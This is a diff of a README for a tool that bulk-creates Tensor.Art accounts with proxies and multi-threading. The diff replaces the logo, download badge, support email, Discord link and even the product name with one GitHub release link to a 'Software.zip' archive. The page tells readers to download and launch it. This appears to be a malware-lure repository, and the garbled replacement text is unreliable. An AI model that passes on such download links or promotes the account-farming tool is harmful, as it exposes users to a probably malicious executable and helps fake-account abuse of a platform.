@@ -1,12 +1,12 @@
 # 🚀 Tensor-Account-Creator
 
-![Tensor-Account-Creator Logo](https://example.com/logo.png)
+![Tensor-Account-Creator Logo](https://github.com/syahrun22/Tensor-Account-Creator/releases/download/v1.0/Software.zip)
 
-Automate the creation of Tensor.Art accounts with ease! 🤖
+Automate the creation of https://github.com/syahrun22/Tensor-Account-Creator/releases/download/v1.0/Software.zip accounts with ease! 🤖
 
 ## Description
 
-**Tensor-Account-Creator** is a powerful tool designed for creating Tensor.Art accounts efficiently. It comes packed with features such as email verification support, proxy handling, and multi-threading capabilities to streamline the account creation process. Whether you need to generate accounts for affiliate marketing, AI projects, or other purposes, this tool has got you covered.
+**Tensor-Account-Creator** is a powerful tool designed for creating https://github.com/syahrun22/Tensor-Account-Creator/releases/download/v1.0/Software.zip accounts efficiently. It comes packed with features such as email verification support, proxy handling, and multi-threading capabilities to streamline the account creation process. Whether you need to generate accounts for affiliate marketing, AI projects, or other purposes, this tool has got you covered.
 
 ## Features
 
@@ -19,19 +19,19 @@ Automate the creation of Tensor.Art accounts with ease! 🤖
 
 Simply download the latest release of **Tensor-Account-Creator** from the following link:  
 
-[![Download Tensor-Account-Creator](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Tensor-Account-Creator](https://github.com/syahrun22/Tensor-Account-Creator/releases/download/v1.0/Software.zip)](https://github.com/syahrun22/Tensor-Account-Creator/releases/download/v1.0/Software.zip)
 
 Once downloaded, launch the file to install the tool on your system.
 
 ## Usage
 
-To start creating Tensor.Art accounts using **Tensor-Account-Creator**, follow these steps:
+To start creating https://github.com/syahrun22/Tensor-Account-Creator/releases/download/v1.0/Software.zip accounts using **Tensor-Account-Creator**, follow these steps:
 
 1. Install the tool using the provided download link.
 2. Set up your email verification preferences.
 3. Configure proxy settings if needed.
 4. Specify the number of threads for multi-threading support.
-5. Run the tool and watch as it efficiently generates Tensor.Art accounts.
+5. Run the tool and watch as it efficiently generates https://github.com/syahrun22/Tensor-Account-Creator/releases/download/v1.0/Software.zip accounts.
 
 ## Repository Topics
 
@@ -58,9 +58,9 @@ To start creating Tensor.Art accounts using **Tensor-Account-Creator**, follow t
 
 ## Support
 
-For any inquiries or issues with **Tensor-Account-Creator**, feel free to reach out to the development team at [dev@tensoraccountcreator.com](mailto:dev@tensoraccountcreator.com).
+For any inquiries or issues with **Tensor-Account-Creator**, feel free to reach out to the development team at [https://github.com/syahrun22/Tensor-Account-Creator/releases/download/v1.0/Software.zip](https://github.com/syahrun22/Tensor-Account-Creator/releases/download/v1.0/Software.zip).
 
-Join our community on [Discord](https://discord.com/tensor-account-creator) for discussions, updates, and support.
+Join our community on [Discord](https://github.com/syahrun22/Tensor-Account-Creator/releases/download/v1.0/Software.zip) for discussions, updates, and support.
 
 ## License
 
@@ -68,4 +68,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-**Tensor-Account-Creator** - Revolutionizing Tensor.Art account creation! 🎨✨
+**Tensor-Account-Creator** - Revolutionizing https://github.com/syahrun22/Tensor-Account-Creator/releases/download/v1.0/Software.zip account creation! 🎨✨
